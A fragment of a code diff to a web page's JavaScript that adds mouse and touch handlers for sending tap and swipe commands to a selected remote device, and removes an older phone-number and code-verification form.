+                const endX = (e.clientX - rect.left) * screenScaleX;
+                const endY = (e.clientY - rect.top) * screenScaleY;
+                
+                sendCommand({
+                    type: 'swipe',
+                    startX: Math.round(parseFloat(screen.dataset.startX)),
+                    startY: Math.round(parseFloat(screen.dataset.startY)),
+                    endX: Math.round(endX),
+                    endY: Math.round(endY)
+                });
+            });
+            
+            // Mobile touch support
+            screen.addEventListener('touchstart', (e) => {
+                e.preventDefault();
+                if (!selectedDeviceId) return;
+                const touch = e.touches[0];
+                const rect = screen.getBoundingClientRect();
+                const x = (touch.clientX - rect.left) * screenScaleX;
+                const y = (touch.clientY - rect.top) * screenScaleY;
+                
+                screen.dataset.startX = x;
+                screen.dataset.startY = y;
+                sendCommand({ type: 'touch', x: Math.round(x), y: Math.round(y) });
+            });
+            
+            screen.addEventListener('touchend', (e) => {
+                e.preventDefault();
+                if (!selectedDeviceId) return;
+                const touch = e.changedTouches[0];
+                const rect = screen.getBoundingClientRect();
+                const endX = (touch.clientX - rect.left) * screenScaleX;
+                const endY = (touch.clientY - rect.top) * screenScaleY;
+                
+                sendCommand({
+                    type: 'swipe',
+                    startX: Math.round(parseFloat(screen.dataset.startX)),
+                    startY: Math.round(parseFloat(screen.dataset.startY)),
+                    endX: Math.round(endX),
+                    endY: Math.round(endY)
+                });
+            });
         });
-
-        document.getElementById('phone').addEventListener('keypress', function(e) {
-            if (e.key === 'Enter') sendCode();
-        });
-
-        document.getElementById('password').addEventListener('keypress', function(e) {
-            if (e.key === 'Enter') verifyCode();
-        });
-
-        // Load server info on page load
-        window.addEventListener('load', () => {
-            loadServerInfo();
-            document.getElementById('phone').focus();
-        });
+        
+        // Initialize
+        loadDevices();
     </script>
 </body>
 </html>
